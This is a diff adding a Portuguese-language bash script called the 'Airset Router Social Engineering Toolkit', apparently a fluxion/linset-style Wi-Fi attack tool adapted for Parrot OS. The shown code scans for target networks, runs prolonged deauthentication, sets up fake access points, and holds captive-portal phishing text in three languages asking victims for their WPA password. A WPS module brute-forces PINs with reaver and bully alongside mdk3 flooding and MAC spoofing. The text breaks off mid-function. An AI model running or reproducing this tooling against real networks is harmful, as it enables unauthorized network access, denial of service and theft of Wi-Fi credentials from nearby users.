@@ -1,0 +1,1446 @@
+#!/bin/bash
+
+########## DEBUG Mode ##########
+##                            ##
+FLUX_DEBUG=0
+##                            ##
+################################
+
+# ============================================================
+# Airset Router Social Engineering Toolkit
+# Adaptado para Parrot OS 7 (Debian Bookworm / Python 3)
+# Melhorias: ip/ss em vez de ifconfig/netstat, python3,
+#             systemctl, airmon-ng nativo, php8.2-cgi,
+#             detecção robusta de interface, tratamento de erros
+# ============================================================
+
+if [[ $EUID -ne 0 ]]; then
+    echo -e "\e[1;31mVocê precisa executar esse script como root.\e[0m"
+    exit 1
+fi
+
+if [ -z "${DISPLAY:-}" ]; then
+    echo -e "\e[1;31mO script deve ser executado dentro de uma sessão gráfica (X11).\e[0m"
+    exit 1
+fi
+
+clear
+
+##################################### < CONFIGURAÇÃO > #####################################
+DUMP_PATH="/tmp/TMPairset"
+HANDSHAKE_PATH="/root/handshakes"
+PASSLOG_PATH="/root/pwlog"
+WORK_DIR=$(pwd)
+
+# Obtém o IP local (excluindo loopback) usando 'ip' (ifconfig está obsoleto)
+ipNmap=$(ip -4 addr show | grep -v '127\.0\.0\.1' | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
+
+# Duração do deauth durante a captura do handshake
+DEAUTHTIME="9999999999999"
+revision=96
+version=0.24
+IP=192.168.1.1
+RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
+
+# Detectar binário PHP-CGI (Parrot OS 7 usa php8.2-cgi ou php-cgi)
+PHP_CGI=""
+for bin in php8.2-cgi php8.1-cgi php-cgi; do
+    if command -v "$bin" &>/dev/null; then
+        PHP_CGI=$(command -v "$bin")
+        break
+    fi
+done
+if [ -z "$PHP_CGI" ]; then
+    # tenta localizar manualmente
+    PHP_CGI=$(find /usr/bin -name 'php*cgi' 2>/dev/null | sort -V | tail -1)
+fi
+
+#Colors
+white="\033[1;37m"
+grey="\033[0;37m"
+purple="\033[0;35m"
+red="\033[1;31m"
+green="\033[1;32m"
+yellow="\033[1;33m"
+Purple="\033[0;35m"
+Cyan="\033[0;36m"
+Cafe="\033[0;33m"
+Fiuscha="\033[0;35m"
+blue="\033[1;34m"
+transparent="\e[0m"
+
+general_back="Voltar"
+general_error_1="Não Encontrado"
+general_case_error="Opção inválida. Escolha novamente"
+general_exitmode="Limpando rastros e encerrando"
+general_exitmode_1="Desabilitando interface de monitoramento"
+general_exitmode_2="Desabilitando interface"
+general_exitmode_3="Desabilitando ${grey}encaminhamento de pacotes"
+general_exitmode_4="Limpando ${grey}iptables"
+general_exitmode_5="Restaurando ${grey}tput"
+general_exitmode_6="Reiniciando ${grey}NetworkManager"
+general_exitmode_7="Limpeza concluída com sucesso!"
+general_exitmode_8="Obrigado por usar o airset"
+############################################################################################
+
+# DEBUG MODE: 0 = Normal | 1 = Desenvolvedor
+if [ "$FLUX_DEBUG" = "1" ]; then
+    export flux_output_device=/dev/stdout
+    HOLD="-hold"
+else
+    export flux_output_device=/dev/null
+    HOLD=""
+fi
+
+function conditional_clear() {
+    if [[ "$flux_output_device" != "/dev/stdout" ]]; then clear; fi
+}
+
+# Garante que airmon-ng é executável (usa o do PATH, não relativo)
+function airmon() {
+    command -v airmon-ng &>/dev/null || { echo -e "${red}airmon-ng não encontrado!${transparent}"; exit 1; }
+}
+airmon
+
+# Animação de spinner
+function spinner() {
+    local pid=$1
+    local delay=0.15
+    local spinstr='|/-\'
+    while [ "$(ps a | awk '{print $1}' | grep -w $pid)" ]; do
+        local temp=${spinstr#?}
+        printf " [%c]  " "$spinstr"
+        local spinstr=$temp${spinstr%"$temp"}
+        sleep $delay
+        printf "\b\b\b\b\b\b"
+    done
+    printf "    \b\b\b\b"
+}
+
+function err_report() {
+    echo "Erro na linha $1"
+}
+
+if [ "$FLUX_DEBUG" = "1" ]; then
+    trap 'err_report $LINENO' ERR
+fi
+
+trap exitmode SIGINT SIGHUP
+
+# KILL ALL — encerramento limpo
+function exitmode() {
+    conditional_clear
+    top
+    echo -e "\n\n${white}[${red}-${white}] ${red}${general_exitmode}${transparent}"
+
+    for proc in aireplay-ng airodump-ng hostapd lighttpd dhcpd mdk3; do
+        if pgrep -x "$proc" &>/dev/null; then
+            echo -e "${white}[${red}-${white}] ${white}Encerrando ${grey}${proc}${transparent}"
+            killall "$proc" &>"$flux_output_device"
+        fi
+    done
+
+    # Encerra fakedns Python 3
+    if pgrep -f "fakedns" &>/dev/null; then
+        echo -e "${white}[${red}-${white}] ${white}Encerrando ${grey}fakedns${transparent}"
+        pkill -f "fakedns" &>"$flux_output_device"
+    fi
+
+    if [ -n "$WIFI_MONITOR" ]; then
+        echo -e "${white}[${red}-${white}] ${white}${general_exitmode_1} ${green}${WIFI_MONITOR}${transparent}"
+        airmon-ng stop "$WIFI_MONITOR" &>"$flux_output_device"
+    fi
+
+    if [ -n "$WIFI" ]; then
+        echo -e "${white}[${red}-${white}] ${white}${general_exitmode_2} ${green}${WIFI}${transparent}"
+        for iface in $WIFI $WIFI_MONITOR1 $WIFI_MONITOR2 $WIFI_MONITOR3 $WIFI_MONITOR4 $WIFI_MONITOR5; do
+            [ -n "$iface" ] && airmon-ng stop "$iface" &>"$flux_output_device"
+        done
+        macchanger -p "$WIFI" &>"$flux_output_device"
+    fi
+
+    if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
+        echo -e "${white}[${red}-${white}] ${white}${general_exitmode_3}${transparent}"
+        sysctl -w net.ipv4.ip_forward=0 &>"$flux_output_device"
+    fi
+
+    echo -e "${white}[${red}-${white}] ${white}${general_exitmode_4}${transparent}"
+    iptables --flush
+    iptables --table nat --flush
+    iptables --delete-chain
+    iptables --table nat --delete-chain
+
+    echo -e "${white}[${red}-${white}] ${white}${general_exitmode_5}${transparent}"
+    tput cnorm
+
+    if [ "$FLUX_DEBUG" != "1" ]; then
+        echo -e "${white}[${red}-${white}] ${white}Removendo ${grey}arquivos temporários${transparent}"
+        rm -rf "${DUMP_PATH:?}"/* &>"$flux_output_device"
+    fi
+
+    echo -e "${white}[${red}-${white}] ${white}${general_exitmode_6}${transparent}"
+    # Parrot OS 7 usa systemctl
+    systemctl restart NetworkManager &>"$flux_output_device" &
+
+    echo -e "${white}[${green}+${white}] ${green}${general_exitmode_7}${transparent}"
+    echo -e "${white}[${green}+${white}] ${grey}${general_exitmode_8}${transparent}"
+    sleep 2
+    clear
+    exit 0
+}
+
+####################################### < STRINGS WEB (multilíngue) > ########################################
+# PT-BR
+DIALOG_WEB_INFO_POR="Por razões de segurança, digite a senha para acessar a Internet"
+DIALOG_WEB_INPUT_POR="Digite sua senha WPA"
+DIALOG_WEB_SUBMIT_POR="Enviar"
+DIALOG_WEB_ERROR_POR="Erro: A senha digitada está incorreta!"
+DIALOG_WEB_OK_POR="A sua conexão será restaurada em breve."
+DIALOG_WEB_BACK_POR="Voltar"
+DIALOG_WEB_ERROR_MSG_POR="Campo de preenchimento obrigatório."
+DIALOG_WEB_LENGHT_MIN_POR="A senha deve ter mais de {0} caracteres"
+DIALOG_WEB_LENGHT_MAX_POR="A chave deve ser menor que {0} caracteres"
+DIALOG_WEB_DIR_POR="ltr"
+# EN
+DIALOG_WEB_INFO_ENG="For security reasons, enter the WPA key to access the Internet."
+DIALOG_WEB_INPUT_ENG="Enter your WPA password:"
+DIALOG_WEB_SUBMIT_ENG="Submit"
+DIALOG_WEB_ERROR_ENG="Error: The entered password is not correct!"
+DIALOG_WEB_OK_ENG="Your connection will be restored in a few moments."
+DIALOG_WEB_BACK_ENG="Back"
+DIALOG_WEB_ERROR_MSG_ENG="This field is required."
+DIALOG_WEB_DIR_ENG="ltr"
+# ES
+DIALOG_WEB_INFO_ESP="Por razones de seguridad, teclea tu clave WPA para acceder a internet"
+DIALOG_WEB_INPUT_ESP="Teclea tu contraseña WPA:"
+DIALOG_WEB_SUBMIT_ESP="Enviar"
+DIALOG_WEB_ERROR_ESP="Error: La contraseña introducida no es correcta"
+DIALOG_WEB_OK_ESP="Tu conexión será restaurada en unos pocos minutos"
+DIALOG_WEB_DIR_ESP="ltr"
+
+# Banner ASCII
+function top() {
+    conditional_clear
+    echo
+    echo -e "${red}                █████╗ ██╗██████╗ ███████╗███████╗████████╗ "
+    echo -e "${red}               ██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝"
+    echo -e "${red}               ███████║██║██████╔╝███████╗█████╗     ██║   "
+    echo -e "${red}               ██╔══██║██║██╔══██╗╚════██║██╔══╝     ██║   "
+    echo -e "${red}               ██║  ██║██║██║  ██║███████║███████╗   ██║   "
+    echo -e "${red}               ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   "
+    echo -e "${white}           Airset — Router Social Engineering Toolkit"
+    echo -e "${green}  v${version} | Parrot OS 7 | By Alef Carvalho [W4R10CK] ${transparent}"
+    echo
+}
+
+################################### < VERIFICAÇÃO DE DEPENDÊNCIAS > ###################################
+function checkdependences() {
+
+    local missing=0
+
+    check_dep() {
+        local name="$1"
+        local cmd="${2:-$1}"
+        local note="${3:-}"
+        printf "%-20s" "$name"
+        if command -v "$cmd" &>/dev/null || [ -x "$cmd" ]; then
+            echo -e "${green}OK!${transparent}"
+        else
+            echo -e "${red}NÃO INSTALADO${transparent} ${note}"
+            missing=1
+        fi
+        sleep 0.02
+    }
+
+    check_dep "aircrack-ng"
+    check_dep "aireplay-ng"
+    check_dep "airmon-ng"
+    check_dep "airodump-ng"
+    check_dep "awk"
+    check_dep "bully"
+    check_dep "curl"
+    check_dep "dhcpd"          "dhcpd"        "(isc-dhcp-server)"
+    check_dep "hostapd"
+    check_dep "iwconfig"       "iwconfig"     "(wireless-tools)"
+    check_dep "lighttpd"
+    check_dep "macchanger"
+    check_dep "mdk3"
+    check_dep "nmap"
+    check_dep "openssl"
+    check_dep "pyrit"
+    check_dep "python3"
+    check_dep "reaver"
+    check_dep "rfkill"
+    check_dep "strings"        "strings"      "(binutils)"
+    check_dep "fuser"          "fuser"        "(psmisc)"
+    check_dep "unzip"
+    check_dep "xterm"
+    check_dep "zenity"
+
+    # PHP-CGI — verificação separada pois pode ter nome versionado
+    printf "%-20s" "php-cgi"
+    if [ -n "$PHP_CGI" ]; then
+        echo -e "${green}OK! ($PHP_CGI)${transparent}"
+    else
+        echo -e "${red}NÃO INSTALADO${transparent} (php8.2-cgi ou php-cgi)"
+        missing=1
+    fi
+    sleep 0.02
+
+    if [ "$missing" = "1" ]; then
+        echo
+        echo -e "${red}Instale as dependências faltantes e tente novamente.${transparent}"
+        echo -e "${yellow}Dica (Parrot OS 7):${transparent} apt install aircrack-ng hostapd lighttpd isc-dhcp-server macchanger mdk3 reaver bully php8.2-cgi nmap pyrit rfkill binutils psmisc xterm zenity curl unzip"
+        exit 1
+    fi
+
+    sleep 1
+    clear
+}
+
+top
+checkdependences
+
+# Cria diretórios de trabalho
+for dir in "$DUMP_PATH" "$HANDSHAKE_PATH" "$PASSLOG_PATH"; do
+    [ ! -d "$dir" ] && mkdir -p "$dir" &>"$flux_output_device"
+done
+
+if [ "$FLUX_DEBUG" != "1" ]; then
+    top
+fi
+
+# Informações sobre o AP alvo
+function infoap() {
+    Host_MAC_info1=$(echo "$Host_MAC" | awk 'BEGIN{FS=":"}{print $1":"$2":"$3}' | tr '[:upper:]' '[:lower:]')
+    Host_MAC_MODEL=$(macchanger -l | grep "$Host_MAC_info1" | cut -d " " -f 5-)
+    echo "Dados da Rede Alvo:"
+    echo
+    echo -e "               ${blue}Nome:${transparent}       $Host_SSID / $Host_ENC"
+    echo -e "               ${blue}Canal:${transparent}      $channel"
+    echo -e "               ${blue}Velocidade:${transparent} ${speed:2} Mbps"
+    echo -e "               ${blue}MAC:${transparent}        $mac (${yellow}${Host_MAC_MODEL}${transparent})"
+    echo
+}
+
+################################### < MENU / RESOLUÇÃO > ###################################
+
+function setresolution() {
+    function resA() { TOPLEFT="-geometry 90x13+0+0"; TOPRIGHT="-geometry 83x26-0+0"; BOTTOMLEFT="-geometry 90x24+0-0"; BOTTOMRIGHT="-geometry 75x12-0-0"; TOPLEFTBIG="-geometry 91x42+0+0"; TOPRIGHTBIG="-geometry 83x26-0+0"; }
+    function resB() { TOPLEFT="-geometry 92x14+0+0"; TOPRIGHT="-geometry 68x25-0+0"; BOTTOMLEFT="-geometry 92x36+0-0"; BOTTOMRIGHT="-geometry 74x20-0-0"; TOPLEFTBIG="-geometry 100x52+0+0"; TOPRIGHTBIG="-geometry 74x30-0+0"; }
+    function resC() { TOPLEFT="-geometry 100x20+0+0"; TOPRIGHT="-geometry 109x20-0+0"; BOTTOMLEFT="-geometry 100x30+0-0"; BOTTOMRIGHT="-geometry 109x20-0-0"; TOPLEFTBIG="-geometry 100x52+0+0"; TOPRIGHTBIG="-geometry 109x30-0+0"; }
+    function resD() { TOPLEFT="-geometry 110x35+0+0"; TOPRIGHT="-geometry 99x40-0+0"; BOTTOMLEFT="-geometry 110x35+0-0"; BOTTOMRIGHT="-geometry 99x30-0-0"; TOPLEFTBIG="-geometry 110x72+0+0"; TOPRIGHTBIG="-geometry 99x40-0+0"; }
+    function resE() { TOPLEFT="-geometry 130x43+0+0"; TOPRIGHT="-geometry 68x25-0+0"; BOTTOMLEFT="-geometry 130x40+0-0"; BOTTOMRIGHT="-geometry 132x35-0-0"; TOPLEFTBIG="-geometry 130x85+0+0"; TOPRIGHTBIG="-geometry 132x48-0+0"; }
+    function resF() { TOPLEFT="-geometry 100x17+0+0"; TOPRIGHT="-geometry 90x27-0+0"; BOTTOMLEFT="-geometry 100x30+0-0"; BOTTOMRIGHT="-geometry 90x20-0-0"; TOPLEFTBIG="-geometry 100x70+0+0"; TOPRIGHTBIG="-geometry 90x27-0+0"; }
+
+    detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
+    case $detectedresolution in
+        "1024x600")  resA ;;
+        "1024x768")  resB ;;
+        "1280x768")  resC ;;
+        "1366x768")  resC ;;
+        "1280x1024") resD ;;
+        "1600x1200") resE ;;
+        "1920x1080") resE ;;
+        *)           resA ;;
+    esac
+
+    language
+}
+
+function language() { huebr; setinterface; }
+
+function huebr() {
+    header_setinterface="Selecione uma interface de rede Wi-Fi"
+    setinterface_error="Nenhuma interface Wi-Fi encontrada (use um adaptador USB em VM)"
+    header_choosescan="Selecione o canal"
+    choosescan_option_1="Escanear todos os canais"
+    choosescan_option_2="Selecionar canal(is) específico(s)"
+    scanchan_option_1="Somente um canal"
+    scanchan_option_2="Múltiplos canais"
+    header_scan="Escaneando Redes"
+    header_scanchan="Escaneando Alvo"
+    header_askAP="Selecione uma opção para criar a rede falsa:"
+    askAP_option_1="Hostapd (${red}Recomendado)"
+    askAP_option_2="Airbase-ng"
+    askAP_option_3="WPS-SLAUGHTER — Bruteforce WPS Pin"
+    askAP_option_4="Bruteforce (Handshake requerido)"
+    header_askauth="Selecione um método de verificação de senha:"
+    askauth_option_1="Handshake (${red}Recomendado)"
+    askauth_option_2="wpa_supplicant (passível de falhas)"
+    header_deauthforce="Selecione o método de verificação de handshake:"
+    deauthforce_option_1="aircrack-ng (Recomendado)"
+    header_deauthMENU="*Capturar Handshake*"
+    deauthMENU_option_1="Verificar handshake"
+    header_webinterface="Selecione uma opção:"
+    header_ConnectionRESET="Selecionar página de login"
+    general_back="Voltar"
+    general_case_error="Opção inválida"
+    general_exitmode="Limpando rastros e encerrando..."
+    selection_1="Rede com clientes (necessário para o ataque)"
+    selection_2="Selecione seu alvo. Para escanear novamente pressione: ${red}[r]${transparent}"
+}
+
+################################### < SELEÇÃO DE INTERFACE > ###################################
+function setinterface() {
+    conditional_clear
+    top
+    rfkill unblock all
+
+    # Para todas as interfaces em modo monitor
+    while IFS= read -r monkill; do
+        [ -n "$monkill" ] && airmon-ng stop "$monkill" &>"$flux_output_device"
+    done < <(iwconfig 2>&1 | grep Monitor | awk '{print $1}')
+
+    # Lista interfaces wireless via airmon-ng (Parrot OS 7 compatível)
+    readarray -t wirelessifaces < <(airmon-ng 2>/dev/null | grep -E '^[a-zA-Z]' | awk '{print $2}' | grep -v '^$')
+    INTERFACESNUMBER=${#wirelessifaces[@]}
+
+    if [ "$INTERFACESNUMBER" -gt "0" ]; then
+        if [ "$INTERFACESNUMBER" -eq "1" ]; then
+            PREWIFI="${wirelessifaces[0]}"
+        else
+            echo -e "$header_setinterface"
+            echo
+            for ((i=0; i<INTERFACESNUMBER; i++)); do
+                echo -e "      ${red}[${yellow}$((i+1))${red}]${transparent} ${wirelessifaces[$i]}"
+            done
+            echo
+            echo -n -e "${red}[${white}w4r10ck${white}@${white}airset${red}]-[${white}~${red}]${transparent}"
+            read -r line
+            idx=$((line-1))
+            PREWIFI="${wirelessifaces[$idx]}"
+        fi
+
+        if [ ${#PREWIFI} -le 2 ]; then
+            conditional_clear; top; setinterface; return
+        fi
+
+        # Para processos que interferem
+        readarray -t naggysoftware < <(airmon-ng check "$PREWIFI" 2>/dev/null | tail -n +8 | grep -v "on interface" | awk '{print $2}')
+        for nagger in "${naggysoftware[@]}"; do
+            [ -n "$nagger" ] && killall "$nagger" &>"$flux_output_device"
+        done
+        sleep 0.5
+
+        # Inicia modo monitor com airmon-ng
+        WIFIMONITOR=$(airmon-ng start "$PREWIFI" 2>/dev/null | grep -oP '(?<=monitor mode vif enabled for \[phy\d+\])\S+|(?<=monitor mode enabled on )\S+' | head -1)
+        # Fallback: tenta detectar pela saída padrão do airmon-ng
+        if [ -z "$WIFIMONITOR" ]; then
+            WIFIMONITOR=$(airmon-ng start "$PREWIFI" 2>/dev/null | grep -oP '\b\w+mon\b|\b\w+mon\d+\b' | head -1)
+        fi
+        # Último fallback: adiciona "mon" ao nome
+        [ -z "$WIFIMONITOR" ] && WIFIMONITOR="${PREWIFI}mon"
+
+        WIFI_MONITOR="$WIFIMONITOR"
+        WIFI="$PREWIFI"
+    else
+        echo -e "$setinterface_error"
+        sleep 5
+        exitmode
+    fi
+
+    deltax
+}
+
+function deltax() {
+    conditional_clear
+    CSVDB=dump-01.csv
+    rm -rf "${DUMP_PATH:?}"/dump*
+    choosescan
+    selection
+}
+
+function choosescan() {
+    while true; do
+        conditional_clear
+        top
+        echo -e " $header_choosescan:"
+        echo -e "  ${white}[1]${transparent} $choosescan_option_1"
+        echo -e "  ${white}[2]${transparent} $choosescan_option_2"
+        echo -e "  ${white}[3]${transparent} $general_back"
+        echo -n -e "${red}[${white}w4r10ck${white}@${white}airset${red}]-[${white}~${red}]${transparent}"
+        read -r yn
+        case $yn in
+            1) Scan; break ;;
+            2) Scanchan; break ;;
+            3) setinterface; break ;;
+            *) echo "Opção desconhecida. Tente novamente"; conditional_clear ;;
+        esac
+    done
+}
+
+function Scanchan() {
+    conditional_clear
+    top
+    echo -e "     Canal único: ${green}6${transparent}"
+    echo -e "     Range:       ${green}1-5${transparent}"
+    echo -e "     Múltiplos:   ${green}1,2,5-7,11${transparent}"
+    echo -n -e "${red}[${white}w4r10ck${white}@${white}airset${red}]-[${white}~${red}]${transparent}"
+    read -r channel_number
+    conditional_clear
+    rm -rf "${DUMP_PATH:?}"/dump*
+    xterm $HOLD -title "$header_scanchan [$channel_number]" $TOPLEFTBIG \
+        -bg "#000000" -fg "#FFFFFF" \
+        -e airodump-ng --encrypt WPA -w "$DUMP_PATH/dump" --channel "$channel_number" -a "$WIFI_MONITOR" --ignore-negative-one
+}
+
+function Scan() {
+    conditional_clear
+    rm -rf "${DUMP_PATH:?}"/dump*
+    xterm $HOLD -title "$header_scan" $TOPLEFTBIG \
+        -bg "#E62117" -fg "#FFFFFF" \
+        -e airodump-ng --encrypt WPA -w "$DUMP_PATH/dump" "$WIFI_MONITOR"
+}
+
+function selection() {
+    conditional_clear
+    top
+
+    LINEAS_WIFIS_CSV=$(wc -l < "$DUMP_PATH/$CSVDB" 2>/dev/null || echo 0)
+
+    if [ -z "$LINEAS_WIFIS_CSV" ] || [ "$LINEAS_WIFIS_CSV" = "0" ]; then
+        conditional_clear; top
+        echo -e "${red}[${yellow}i${red}]${transparent} Erro: interface wireless não suportada ou sem redes encontradas."
+        echo -n -e "Deseja sair? ${red}[${yellow}s${red}/${yellow}n${red}]${transparent}: "
+        read -r back
+        case "$back" in
+            s|S) exitmode ;;
+            *) setinterface ;;
+        esac
+        return
+    fi
+
+    if [ "$LINEAS_WIFIS_CSV" -le 3 ]; then
+        deltax; return
+    fi
+
+    fluxionap=$(grep -an 'Station\|Cliente' "$DUMP_PATH/$CSVDB" | awk -F: '{print $1}' | head -1)
+    fluxionap=$(( fluxionap - 1 ))
+    head -n "$fluxionap" "$DUMP_PATH/$CSVDB" > "$DUMP_PATH/dump-02.csv"
+    tail -n +"$fluxionap" "$DUMP_PATH/$CSVDB" > "$DUMP_PATH/clientes.csv"
+
+    echo "                        Redes Encontradas:"
+    echo ""
+    echo " ID      MAC                     CANAL   SEG.    SINAL    NOME"
+    echo ""
+    i=0
+
+    while IFS=, read -r MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY; do
+        longueur=${#MAC}
+        PRIVACY=$(echo "$PRIVACY" | tr -d "^ ")
+        PRIVACY=${PRIVACY:0:4}
+        if [ "$longueur" -ge 17 ]; then
+            i=$((i+1))
+            POWER=$(( POWER + 100 ))
+            CLIENTE=$(grep "$MAC" "$DUMP_PATH/clientes.csv" || true)
+            if [ -n "$CLIENTE" ]; then
+                CLIENTE="*"
+                echo -e " ${red}[${white}${i}${red}]${green}${CLIENTE}\t${red}${MAC}\t${red}${CHANNEL}\t${green}${PRIVACY}\t  ${red}${POWER}%\t${red}${ESSID}${transparent}"
+            else
+                echo -e " ${red}[${yellow}${i}${red}]${white}${CLIENTE}\t${yellow}${MAC}\t${green}${CHANNEL}\t${blue}${PRIVACY}\t  ${yellow}${POWER}%\t${green}${ESSID}${transparent}"
+            fi
+            aidlenght=$IDLENGTH
+            assid[$i]=$ESSID
+            achannel[$i]=$CHANNEL
+            amac[$i]=$MAC
+            aprivacy[$i]=$PRIVACY
+            aspeed[$i]=$SPEED
+        fi
+    done < "$DUMP_PATH/dump-02.csv"
+
+    echo
+    echo -e "${green}(${white}*${green}) $selection_1${transparent}"
+    echo ""
+    echo -e " $selection_2"
+    echo -n -e "${red}[${white}w4r10ck${white}@${white}airset${red}]-[${white}~${red}]${transparent}"
+    read -r choice
+
+    if [ "$choice" = "r" ]; then deltax; return; fi
+
+    idlenght=${aidlenght[$choice]}
+    ssid=${assid[$choice]}
+    channel=$(echo "${achannel[$choice]}" | tr -d '[:space:]')
+    mac=${amac[$choice]}
+    privacy=${aprivacy[$choice]}
+    speed=${aspeed[$choice]}
+    Host_IDL=$idlenght
+    Host_SPEED=$speed
+    Host_ENC=$privacy
+    Host_MAC=$mac
+    Host_CHAN=$channel
+    acouper=${#ssid}
+    fin=$(( acouper - idlenght ))
+    Host_SSID=${ssid:1:fin}
+    Host_SSID2=$(echo "$Host_SSID" | sed 's/ //g;s/\[//g;s/\]//g')
+    conditional_clear
+    askAP
+}
+
+################################### < FAKE AP > ###################################
+function askAP() {
+    DIGITOS_WIFIS_CSV=$(echo "$Host_MAC" | wc -m)
+    if [ "$DIGITOS_WIFIS_CSV" -le 15 ]; then selection; return; fi
+
+    top
+    while true; do
+        infoap
+        echo -e "${red}[${yellow}i${red}]${transparent} $header_askAP"
+        echo -e "      ${red}[${yellow}1${red}]${transparent} $askAP_option_1"
+        echo -e "      ${red}[${yellow}2${red}]${transparent} $askAP_option_2"
+        echo -e "      ${red}[${yellow}3${red}]${transparent} $askAP_option_3"
+        echo -e "      ${red}[${yellow}4${red}]${transparent} $askAP_option_4"
+        echo -e "      ${red}[${yellow}5${red}]${red} $general_back${transparent}"
+        echo -n -e "${red}[${white}w4r10ck${white}@${white}airset${red}]-[${white}~${red}]${transparent}"
+        read -r yn
+        case $yn in
+            1) fakeapmode="hostapd"; authmode="handshake"; handshakelocation; break ;;
+            2) fakeapmode="airbase-ng"; askauth; break ;;
+            3) fakeapmode="WPS-SLAUGHTER"; wps; break ;;
+            4) fakeapmode="Aircrack-ng"; Bruteforce; break ;;
+            5) selection; break ;;
+            *) echo "$general_case_error"; conditional_clear ;;
+        esac
+    done
+}
+
+function askauth() {
+    conditional_clear
+    top
+    while true; do
+        echo -e "${red}[${yellow}i${red}]${transparent} $header_askauth"
+        echo -e "      ${red}[${yellow}1${red}]${transparent} $askauth_option_1"
+        echo -e "      ${red}[${yellow}2${red}]${transparent} $askauth_option_2"
+        echo -e "      ${red}[${yellow}3${red}]${transparent} $general_back"
+        echo -n -e "${red}[${white}w4r10ck${white}@${white}airset${red}]-[${white}~${red}]${transparent}"
+        read -r yn
+        case $yn in
+            1) authmode="handshake"; handshakelocation; break ;;
+            2) authmode="wpa_supplicant"; webinterface; break ;;
+            3) askAP; break ;;
+            *) echo "$general_case_error"; conditional_clear ;;
+        esac
+    done
+}
+
+################################### < WPS SLAUGHTER > ###################################
+function wps() {
+    clear
+    declare WIFI_MONITOR1 WIFI_MONITOR2 WIFI_MONITOR3 WIFI_MONITOR4 WIFI_MONITOR5
+
+    echo "
+██╗    ██╗██████╗ ███████╗      ███████╗██╗      █████╗ ██╗   ██╗ ██████╗ ██╗  ██╗████████╗███████╗██████╗
+██║    ██║██╔══██╗██╔════╝      ██╔════╝██║     ██╔══██╗██║   ██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██╔══██╗
+██║ █╗ ██║██████╔╝███████╗█████╗███████╗██║     ███████║██║   ██║██║  ███╗███████║   ██║   █████╗  ██████╔╝
+██║███╗██║██╔═══╝ ╚════██║╚════╝╚════██║██║     ██╔══██║██║   ██║██║   ██║██╔══██║   ██║   ██╔══╝  ██╔══██╗
+╚███╔███╔╝██║     ███████║      ███████║███████╗██║  ██║╚██████╔╝╚██████╔╝██║  ██║   ██║   ███████╗██║  ██║
+ ╚══╝╚══╝ ╚═╝     ╚══════╝      ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
+"
+    sleep 2; clear; rfkill unblock all
+
+    # Funções para modo monitor usando 'ip' (Parrot OS 7)
+    enable_mon_mode() {
+        local iface="$1"
+        echo "Habilitando modo monitor em $iface"
+        ip link set "$iface" down
+        sleep 1
+        iwconfig "$iface" mode monitor
+        sleep 1
+        ip link set "$iface" up
+        echo "Modo monitor habilitado"
+    }
+
+    mac_change() {
+        local iface="$1"
+        echo "Alterando MAC em $iface"
+        ip link set "$iface" down
+        sleep 2
+        macchanger "$iface" -m 02:22:88:29:EC:6F
+        sleep 2
+        ip link set "$iface" up
+        echo "MAC alterado"
+    }
+
+    WPS_ATTACK_MENU() {
+        top
+        echo "Qual ataque deseja usar?"
+        echo -e "      ${blue}0)${transparent} Selecionar nova rede alvo"
+        echo -e "      ${red}[${yellow}1${red}]${transparent} EAPOL Start Flood"
+        echo -e "      ${red}[${yellow}2${red}]${transparent} Authentication Flood"
+        echo -e "      ${red}[${yellow}3${red}]${transparent} Reaver"
+        echo -e "      ${red}[${yellow}4${red}]${transparent} Verificar WPS desbloqueado"
+        echo -e "      ${red}[${yellow}5${red}]${transparent} Reaver + AutoFlood (ASOC)"
+        echo -e "      ${red}[${yellow}6${red}]${transparent} Reaver + AutoFlood (EAPOL)"
+        echo -e "      ${red}[${yellow}7${red}]${transparent} Bully"
+        echo -e "      ${red}[${yellow}8${red}]${transparent} Bully + AutoFlood (ASOC)"
+        echo -e "      ${red}[${yellow}9${red}]${transparent} Bully + AutoFlood (EAPOL)"
+        echo -e "      ${red}[${yellow}10${red}]${transparent} Sair"
+    }
+
+    top
+    echo "Quantos adaptadores Wi-Fi deseja usar?"
+    echo -e "${blue}1)${transparent} 1 Adaptador"
+    echo -e "${blue}2)${transparent} 2 Adaptadores"
+    echo -e "${blue}3)${transparent} 3 Adaptadores"
+    echo -e "${blue}4)${transparent} 4 Adaptadores"
+    echo -e "${blue}5)${transparent} 5 Adaptadores"
+    read -r a
+
+    case $a in
+        1)
+            read -rp " - Nome do adaptador (ex: wlan0): " WIFI_MONITOR1
+            clear; top; enable_mon_mode "$WIFI_MONITOR1"
+            echo -e "Alterar MAC? ${red}[${yellow}1${red}]${transparent}Sim  ${red}[${yellow}2${red}]${transparent}Não"
+            read -r c
+            [ "$c" = "1" ] && { clear; top; mac_change "$WIFI_MONITOR1"; clear; }
+
+            menu() {
+                clear; WPS_ATTACK_MENU
+                read -r d
+                case $d in
+                    0) clear; top; wpsselection; enable_mon_mode "$WIFI_MONITOR1"; menu ;;
+                    1) timeout 20s mdk3 "$WIFI_MONITOR1" x 0 -t "$mac" -n "$ssid" -s 250; menu ;;
+                    2) timeout 60 mdk3 "$WIFI_MONITOR1" a -a "$mac" -m; menu ;;
+                    3) reaver -i "$WIFI_MONITOR1" -b "$mac" -c "$channel" -vv; menu ;;
+                    4) xterm -e "wash --ignore-fcs -i $WIFI_MONITOR1" &
+                       menu ;;
+                    5) reaver -i "$WIFI_MONITOR1" -b "$mac" -c "$channel" -vv | tee ReaverOutput.txt &
+                       reaver_pid=$!
+                       while kill -0 $reaver_pid 2>/dev/null; do
+                           DETECT=$(awk '/./{line=$0}END{print line}' ReaverOutput.txt)
+                           [[ "$DETECT" == *"limiting"* ]] && mdk3 "$WIFI_MONITOR1" a -a "$mac" -m &
+                           sleep 1
+                       done; menu ;;
+                    6) reaver -i "$WIFI_MONITOR1" -b "$mac" -c "$channel" -vv | tee ReaverOutput.txt &
+                       reaver_pid=$!
+                       while kill -0 $reaver_pid 2>/dev/null; do
+                           DETECT=$(awk '/./{line=$0}END{print line}' ReaverOutput.txt)
